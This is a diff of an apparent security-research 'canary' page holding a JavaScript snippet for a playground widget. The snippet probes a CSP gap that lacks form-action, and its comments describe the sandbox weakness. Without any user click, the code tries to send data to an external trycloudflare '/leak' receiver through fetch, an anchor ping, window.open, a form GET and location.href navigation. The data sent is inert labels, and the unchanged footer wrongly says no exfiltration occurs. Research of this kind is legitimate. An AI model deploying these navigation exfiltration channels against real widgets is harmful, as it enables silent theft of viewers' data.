@@ -18,42 +18,86 @@ footer { padding:12px 16px; color:#789; font-size:12px; border-top:1px solid #33
 </head>
 <body>
 <header>
-  <h1>T61-FETCH-CONTROL - inert copy-paste canary (Pluto Security research)</h1>
+  <h1>T64-NAV-EXFIL - inert copy-paste canary (Pluto Security research)</h1>
   <button onclick="copyCode()">Copy code</button>
   <span class="note">then paste into the playground Output box and press Run</span>
 </header>
-<div id="wrap"><pre id="code">/* T61 FETCH CONTROL - Pluto Security research, inert canary.
-   Question: can the VIEWER-session widget fetch a PINNED jsdelivr URL?
-   (The playground auto-load says &quot;Failed to fetch cdn.jsdelivr.net...&quot;,
-   but the captured widget CSP allowlists jsdelivr for connect-src.)
-   A = pinned commit 6f89b79 (immutable). B = @main (mutable ref).
-   This is INBOUND only - no data leaves the victim. */
+<div id="wrap"><pre id="code">/* T64 NAVIGATION EXFIL - Pluto Security research, inert canary.
+   Rationale: the widget CSP has NO form-action directive (and
+   form-action does NOT fall back to default-src), the sandbox
+   tokens include allow-forms when external navigation is on, and
+   the runner&#x27;s form-routing / navigate-canceller hooks are only
+   installed for OTHER widget classes (enableExternalNavigationGating
+   / disableExternalNavigation are not passed for inline
+   visualizations). T4 (Oct 18) judged forms &quot;blocked&quot; by watching
+   for a NEW TAB - but a form with no target navigates the iframe
+   itself, and there was no network ground truth then.
+   Question: can the VIEWER-session widget send a canary to the
+   researcher&#x27;s own receiver with ZERO clicks via a navigation
+   channel (anchor ping / window.open / form GET / location.href)?
+   fetch is included as the known-blocked control (T43).
+   Data sent = inert &quot;T64-*&quot; labels only. Nothing else stored. */
 (function () {
-  function log(m) { try { console.log(&quot;[T61] &quot; + m); } catch (e) {} }
-  log(&quot;START fetch control (inert, inbound-only) &quot; + Date.now());
+  var R = &quot;https://between-notified-postposted-classic.trycloudflare.com/leak?d=&quot;;
+  function log(m) { try { console.log(&quot;[T64] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
+  log(&quot;START nav-exfil (inert) origin=&quot; + location.origin);
 
-  var BASE = &quot;https://cdn.jsdelivr.net/gh/Pando0192/playground-snippet&quot;;
-  var A = BASE + &quot;@6f89b79/snippet.js&quot;; /* pinned */
-  var B = BASE + &quot;@main/snippet.js&quot;;    /* mutable */
+  var t = 0;
+  function step(f) { setTimeout(f, t); t += 900; }
 
-  function tryFetch(tag, url) {
-    return fetch(url, { cache: &quot;no-store&quot; })
-      .then(function (r) {
-        return r.text().then(function (t) {
-          log(tag + &quot; FETCH-OK status=&quot; + r.status + &quot; len=&quot; + t.length +
-              &quot; head=&quot; + JSON.stringify(t.slice(0, 40)));
-        });
-      })
-      .catch(function (e) {
-        log(tag + &quot; FETCH-FAIL name=&quot; + (e &amp;&amp; e.name) +
-            &quot; msg=&quot; + (e &amp;&amp; e.message));
-      });
-  }
+  /* S1 control: plain fetch - expect CSP-blocked (T43/T61) */
+  step(function () {
+    log(&quot;S1 fetch-control firing&quot;);
+    fetch(R + &quot;T64-S1-fetch-control-&quot; + Date.now(), { cache: &quot;no-store&quot; })
+      .then(function (r) { log(&quot;S1 fetch-OK?! status=&quot; + r.status + &quot; (connect-src changed - report this)&quot;); })
+      .catch(function (e) { log(&quot;S1 fetch-blocked &quot; + (e &amp;&amp; e.message)); });
+  });
 
-  tryFetch(&quot;A-pinned&quot;, A)
-    .then(function () { return tryFetch(&quot;B-main&quot;, B); })
-    .then(function () { log(&quot;DONE A and B attempted&quot;); })
-    .catch(function (e) { log(&quot;UNEXPECTED &quot; + e); });
+  /* S2 anchor ping: ping is governed by ping-src -&gt; default-src &#x27;self&#x27;.
+     Expect blocked by CSP; receiver log decides. href &quot;#&quot; keeps the doc alive. */
+  step(function () {
+    try {
+      var a = document.createElement(&quot;a&quot;);
+      a.href = &quot;#&quot;;
+      a.ping = R + &quot;T64-S2-ping-&quot; + Date.now();
+      document.body.appendChild(a);
+      a.click();
+      log(&quot;S2 ping-click fired (href #)&quot;);
+    } catch (e) { log(&quot;S2 ERR &quot; + e.message); }
+  });
+
+  /* S3 raw window.open popup - expect the Chrome popup blocker (no gesture).
+     If it opens: zero-click data delivery (visible tab). */
+  step(function () {
+    try {
+      var w = window.open(R + &quot;T64-S3-windowopen-&quot; + Date.now(), &quot;_blank&quot;);
+      log(&quot;S3 window.open -&gt; &quot; + (w ? &quot;OPENED (zero-click tab)&quot; : &quot;null (blocked)&quot;));
+    } catch (e) { log(&quot;S3 ERR &quot; + e.message); }
+  });
+
+  /* S4 form GET, _self navigation - the headline channel.
+     May navigate this frame away (app dies after this) or pop a host
+     dialog (openExternalForm). Logged BEFORE firing either way. */
+  step(function () {
+    log(&quot;S4 form-GET firing (frame may navigate away now)&quot;);
+    try {
+      var f = document.createElement(&quot;form&quot;);
+      f.method = &quot;GET&quot;;
+      f.action = R + &quot;T64-S4-form-get-&quot; + Date.now();
+      document.body.appendChild(f);
+      f.submit();
+      log(&quot;S4 submit() returned (no exception)&quot;);
+    } catch (e) { log(&quot;S4 ERR &quot; + e.message); }
+  });
+
+  /* S5 self-navigation via location.href - pure navigation, no form.
+     Only reached if S4 did not navigate the frame. */
+  step(function () {
+    log(&quot;S5 self-nav firing (frame will navigate away if unblocked)&quot;);
+    location.href = R + &quot;T64-S5-selfnav-&quot; + Date.now();
+  });
+
+  step(function () { log(&quot;DONE all steps attempted&quot;); });
 })();
 </pre></div>
 <footer>inert research canary - inbound fetch control only, no exfiltration</footer>
